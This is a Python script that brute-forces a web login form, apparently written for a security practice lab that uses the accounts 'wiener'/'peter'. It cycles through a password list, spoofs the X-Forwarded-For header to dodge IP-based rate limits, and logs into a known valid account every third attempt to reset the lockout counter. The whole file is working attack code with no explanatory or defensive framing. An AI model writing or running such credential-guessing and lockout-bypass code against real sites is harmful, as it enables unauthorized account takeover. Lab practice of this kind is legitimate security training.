import requests
import re

sessionValue=" "
host=" "
passlist=""
yourvalidlogin="wiener"
yourvalidpassword="peter"

def guess_pass(validlogin,password,supportXforward=False,nr=1,resetPass=False):
    cookie={'session':sessionValue}
    payload = {'username':validlogin,'password':password}
    hed={'X-Forwarded-For':'192.168.53.'+str(nr)}
    if resetPass:
        print("-------PASSWORD RESET---------")
        response = requests.post(host ,{'username':yourvalidlogin,'password':yourvalidpassword})
    else:
        try:
            if supportXforward:
                response = requests.post(host ,data=payload,headers=hed)
            else:
                response = requests.post(host ,data=payload)

        except Exception as e:
            print(e)
    #res_status = response.status_code
    #or check 
    res_status = response.history
    return res_status
 
 
def open_passlist_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

def brutepass(validlog="dupa",supportXforward=False):
    if supportXforward ==False:
        response_stat=guess_pass(validlog,"napewnozlypass",supportXforward)
        tryNr=0
        for word in passlist:
            tryNr+=1
            login_reset=tryNr%3
            if login_reset==0:
                guess_pass(validlog,word,supportXforward,tryNr,True)
            new_status=guess_pass(validlog,word,supportXforward,tryNr)
            print("TRY NR: "+str(tryNr)+" pass: "+str(word)+" =  "+str(new_status))
            if response_stat!=new_status:
                print("valid password can be: "+word)
                break
    elif supportXforward ==True:
        response_stat=guess_pass(validlog,"napewnozlypass",supportXforward)
        tryNr=1
        for word in passlist:
            tryNr+=1
            login_reset=tryNr%3
            if login_reset==0:
                guess_pass(validlog,word,supportXforward,tryNr,True)
            new_status=guess_pass(validlog,word,supportXforward,tryNr)
            print("TRY NR: "+str(tryNr)+" pass: "+str(word)+" = "+str(new_status))
            if new_status!=response_stat:
                print("valid password can be: "+word)
                break


try:
    filepath=input("Enter a filepath to list of passwords: ")
    passlist=open_passlist_file(filepath)
except Exception as e:
        print(e)

vallogin=input("Enter a valid login: ")
supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False

brutepass(vallogin,supportXforward)
